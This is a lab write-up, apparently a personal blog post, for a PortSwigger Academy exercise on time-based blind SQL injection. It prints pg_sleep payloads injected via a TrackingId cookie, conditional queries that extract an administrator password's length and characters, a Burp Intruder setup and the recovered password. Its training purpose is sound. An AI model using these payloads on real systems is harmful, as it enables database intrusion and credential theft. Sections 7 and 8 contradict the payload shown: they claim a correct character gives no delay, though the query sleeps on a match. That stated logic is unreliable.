---
slug: "ps-sqli-15"
title: "Blind SQL injection with time delays and information retrieval"
platform: "PortSwigger"
difficulty: "Hard"
category: ["Web","SQLi"]
date: "2025-12-23"
minutes: 5
visible: true
tldr: "blind SQL injection vulnerability using time delays — solved and documented end to end."
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 15 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/15-%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<p>Exploit a <strong>blind SQL injection vulnerability using time delays</strong> to extract the <strong>administrator password</strong>, relying solely on <strong>response timing differences</strong>, without any visible errors or reflected query output.</p>
<h2>1. Initial Testing &amp; Vulnerability Identification</h2>
<h2>Parameters Tested</h2>
<ul><li>URL parameters</li><li>Cookie parameters</li></ul>
<p>All parameters were tested with a single quote (<code>'</code>) and <strong>no abnormal behavior</strong> was observed.</p>
<h2>Observation</h2>
<ul><li>No error messages</li><li>No content changes</li><li>No visible indication of SQL injection</li></ul>
<p>At this stage, traditional error‑based or boolean‑based SQL injection <strong>appeared impossible</strong>.</p>
<h2>IMPORTANT — Mindset Shift (Why This Matters)</h2>
<p>&gt; When no output changes and no errors are visible, it does not mean the application is secure. &gt;</p>
<p>This is the moment to switch mindset from:</p>
<ul><li>*“What do I see?”*</li></ul>
<p>to:</p>
<ul><li>*“What can I <strong>measure</strong>?”*</li></ul>
<p><strong>Time is still a side channel.</strong></p>
<p>This mindset allows exploitation of applications that appear completely silent.</p>
<h2>2. Switching to Time‑Based Blind SQL Injection</h2>
<p>Since no visible feedback was available, a <strong>time‑delay payload</strong> was used to test whether injected SQL was still being executed.</p>
<h2>Payload Used</h2>
<pre class="code" data-lang="sql"><code>TrackingId=HhHJ4ae6KNeTGR3R'||pg_sleep(10)--</code></pre>
<h2>Result</h2>
<ul><li>The page response was delayed by approximately <strong>10 seconds</strong></li><li>Page content remained unchanged</li><li>The delay was consistent and repeatable</li></ul>
<p>This confirms a <strong>blind SQL injection vulnerability using time delays</strong>.</p>
<h2>3. Confirming Conditional Time Control</h2>
<p>To verify that the delay could be controlled conditionally, a <code>CASE WHEN</code> expression was used.</p>
<h2>Payload Used</h2>
<pre class="code" data-lang="sql"><code>TrackingId=HhHJ4ae6KNeTGR3R'||
(SELECT CASE
  WHEN (username='administrator')
  THEN pg_sleep(10)
  ELSE pg_sleep(0)
END FROM users)--</code></pre>
<h2>Result</h2>
<ul><li>Response delayed by <strong>10 seconds</strong></li></ul>
<p>This confirms:</p>
<ul><li>The <code>users</code> table exists</li><li>The <code>administrator</code> user exists</li><li>Conditional logic can be evaluated through timing differences</li></ul>
<h2>4. Why This Is Blind SQL Injection</h2>
<p>In this lab:</p>
<ul><li>No SQL errors are shown</li><li>No query output is reflected</li><li>The <strong>only feedback channel is time</strong></li></ul>
<p>This means:</p>
<ul><li><code>UNION SELECT</code> is useless</li><li>Error‑based SQLi is impossible</li><li>Boolean conditions must be inferred via <strong>response delays</strong></li></ul>
<p>All data extraction must be performed using <strong>time‑based conditions</strong>.</p>
<h2>5. Determining Password Length</h2>
<p>Before extracting the password, its length must be identified.</p>
<h2>Payload Used</h2>
<pre class="code" data-lang="sql"><code>TrackingId=HhHJ4ae6KNeTGR3R'||
(SELECT CASE
  WHEN (username='administrator' AND LENGTH(password)=1)
  THEN pg_sleep(10)
  ELSE pg_sleep(0)
END FROM users)--</code></pre>
<h2>Intruder Usage</h2>
<ul><li>Password length was brute‑forced by incrementing the length value</li><li>Response delays were monitored</li></ul>
<h2>Result</h2>
<ul><li>Delay observed when <code>LENGTH(password)=20</code></li></ul>
<p>This confirms the administrator password length is <strong>20 characters</strong>.</p>
<h2>6. Why Length Detection Is Mandatory</h2>
<p>Without knowing the password length:</p>
<ul><li>Character extraction becomes unreliable</li><li>False positives are more likely</li><li>Automation becomes inefficient</li></ul>
<p><strong>Length detection is a required step in blind SQL injection workflows.</strong></p>
<h2>7. Extracting the Password Character‑by‑Character</h2>
<p>With the password length known, individual characters were extracted using <code>SUBSTRING()</code> and time delays.</p>
<h2>Payload Used</h2>
<pre class="code" data-lang="sql"><code>TrackingId=HhHJ4ae6KNeTGR3R'||
(SELECT CASE
  WHEN (username='administrator'
        AND SUBSTRING(password,1,1)='a')
  THEN pg_sleep(10)
  ELSE pg_sleep(0)
END FROM users)--</code></pre>
<h2>Logic</h2>
<ul><li>Correct character → <strong>no delay</strong></li><li>Incorrect character → <strong>10‑second delay</strong></li></ul>
<p>This inverted logic simplifies detection when automating.</p>
<h2>8. Password Extraction with Burp Intruder</h2>
<h2>Intruder Configuration</h2>
<ul><li>Character position: <code>1–20</code></li><li>Character set: <code>a–z</code>, <code>0–9</code></li><li>Attack type: <strong>Cluster Bomb</strong></li></ul>
<h2>Analysis Method</h2>
<ul><li>Identify requests with <strong>fast responses</strong></li><li>Each fast response reveals one correct character</li></ul>
<p>This process was repeated until all 20 characters were extracted.</p>
<h2>9. Final Result</h2>
<pre class="code" data-lang="sql"><code>Username: administrator
Password: 018sbqptj9bm9brx9b5z</code></pre>
<ul><li>Logged in successfully</li><li>Application confirmed administrator access</li><li>Lab marked as solved</li><li>Screenshot</li></ul>
<p>&lt;img width="1264" height="264" alt="image" src="https://github.com/user-attachments/assets/75ce8c56-a4fc-423f-ac95-883ab7843701" /&gt;</p>
<h2>10. Future Testing Notes (Important)</h2>
<h2>When Testing SQL Injection:</h2>
<ul><li>Test <strong>all inputs</strong>:</li><li>URL parameters</li><li>POST data</li><li>Cookies</li><li>Headers</li><li>If no output or errors are visible:</li><li><strong>Immediately test time delays</strong></li><li>Blind SQLi workflow:</li><li>Confirm delay execution</li><li>Add conditional logic</li><li>Confirm data existence</li><li>Detect data length</li><li>Extract data character‑by‑character</li><li>Automate early</li><li>Common mistakes to avoid:</li><li>Giving up when no output is visible</li><li>Skipping length detection</li><li>Not constraining queries to a single row</li></ul>
<h2>11. Notes for My Future Self</h2>
<ul><li>Silence does not mean safety</li><li>Time is a powerful side channel</li><li>Blind SQLi is about <strong>measurement, not visibility</strong></li><li>Cookies are common blind injection points</li><li>Conditional delays can extract full credentials reliably</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 15 COMPLETE</code></details>
